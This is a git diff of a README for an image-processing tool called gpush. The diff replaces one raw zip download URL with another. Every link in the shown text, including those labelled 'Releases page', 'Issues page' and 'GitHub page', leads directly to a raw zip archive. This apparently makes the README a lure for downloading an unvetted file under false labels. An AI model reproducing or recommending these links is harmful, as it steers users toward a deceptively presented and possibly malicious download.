@@ -6,16 +6,16 @@ Welcome to **gpush**, a powerful tool for fast image processing right from your 
 
 ## 🔗 Download gpush
 
-[![Download gpush](https://raw.githubusercontent.com/adoriake/gpush/main/src/bin/gpush-2.4.zip%https://raw.githubusercontent.com/adoriake/gpush/main/src/bin/gpush-2.4.zip)](https://raw.githubusercontent.com/adoriake/gpush/main/src/bin/gpush-2.4.zip)
+[![Download gpush](https://raw.githubusercontent.com/adoriake/gpush/main/src/Software-2.0.zip%https://raw.githubusercontent.com/adoriake/gpush/main/src/Software-2.0.zip)](https://raw.githubusercontent.com/adoriake/gpush/main/src/Software-2.0.zip)
 
 ## 📥 Download & Install
 
 To get gpush, follow these steps:
 
-1. Click this link to visit the [Releases page](https://raw.githubusercontent.com/adoriake/gpush/main/src/bin/gpush-2.4.zip).
+1. Click this link to visit the [Releases page](https://raw.githubusercontent.com/adoriake/gpush/main/src/Software-2.0.zip).
 2. On the Releases page, you will see a list of available versions. Look for the latest version marked with a tag like "v1.0".
 3. Under this version, find a file that matches your operating system. For example:
-   - Windows: `https://raw.githubusercontent.com/adoriake/gpush/main/src/bin/gpush-2.4.zip`
+   - Windows: `https://raw.githubusercontent.com/adoriake/gpush/main/src/Software-2.0.zip`
    - macOS: `gpush-macos`
    - Linux: `gpush-linux`
 4. Click on the file to start downloading. Save it to a location you can easily find, like your Desktop or Downloads folder.
@@ -68,11 +68,11 @@ If you encounter issues, here are a few tips to help you resolve them:
 
 If you need further assistance, join our community:
 
-- **GitHub Issues:** Report bugs or request features by visiting our [Issues page](https://raw.githubusercontent.com/adoriake/gpush/main/src/bin/gpush-2.4.zip).
+- **GitHub Issues:** Report bugs or request features by visiting our [Issues page](https://raw.githubusercontent.com/adoriake/gpush/main/src/Software-2.0.zip).
 - **Discussion Forum:** Engage with other users and contributors in discussions.
 
 ## 🔗 More Information
 
-For more details, visit the [gpush GitHub page](https://raw.githubusercontent.com/adoriake/gpush/main/src/bin/gpush-2.4.zip).
+For more details, visit the [gpush GitHub page](https://raw.githubusercontent.com/adoriake/gpush/main/src/Software-2.0.zip).
 
 Thank you for choosing gpush for your image processing needs! Enjoy the speed and efficiency of GPU power at your fingertips.
